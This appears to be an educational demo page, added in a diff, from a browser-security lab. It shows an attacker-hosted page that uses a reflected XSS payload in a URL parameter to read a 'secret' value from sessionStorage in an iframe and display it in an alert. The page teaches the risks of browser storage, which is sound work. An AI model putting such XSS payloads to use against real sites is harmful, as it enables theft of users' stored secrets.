@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    </head>
+    <body class="container mt-3">
+        <h1 class="text-center">Scenario - SessionStorage - Executing XSS</h1>
+
+        <div class="row">
+            <div class="col-12 text-center mt-5">
+                <p>
+                    This page is hosted by the attacker. Clicking the button below will trigger the loading of an error page in the iframe. The error page has an XSS vulnerability allowing the attacker to execute code within the application context.
+                </p>
+
+                <button class="btn btn-primary" onclick="steal_data_sessionstorage()">Steal data from sessionStorage</button>
+            </div>
+            <div class="col-12 text-center mt-5">
+                <iframe width="80%" height="250px"></iframe>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-12 text-center mt-5">
+                <p class="lead">
+                    This scenario illustrates a common attack to steal data fromn the browser. For more context, please refer to the security cheat sheet on <a href="https://cheatsheets.pragmaticwebsecurity.com/browsersecrets.html" target="_blank" rel="noopener">Secure data storage in the browser</a>
+                </p>
+            </div>
+        </div>
+
+
+        <script>
+            function init() {
+                document.querySelector('iframe').contentWindow.document.body.innerHTML = "<p>This is a placeholder iframe. When you click the button, this iframe will be used to launch an XSS attack against the application</p>";
+            }
+            document.addEventListener("DOMContentLoaded", init);
+
+            function steal_data_sessionstorage() {
+                let url = "//sessionstorage.browsersecrets.restograde.com/error/error.html?page=hacked%3Cscript%3Ealert(`Stealing%20data%20from%20the%20iframe:%20${sessionStorage.getItem(%22secret%22)}`)%3C/script%3E";
+                document.querySelector('iframe').contentWindow.location.href = url;
+            }
+        </script>
+
+        <!-- Load helper scripts (We could also implement this with the Web Crypto API) -->
+        <script src="//cdn.browsersecrets.restograde.com/cdn/sha256.min.js"></script>
+    </body>
+</html>
+
+
+
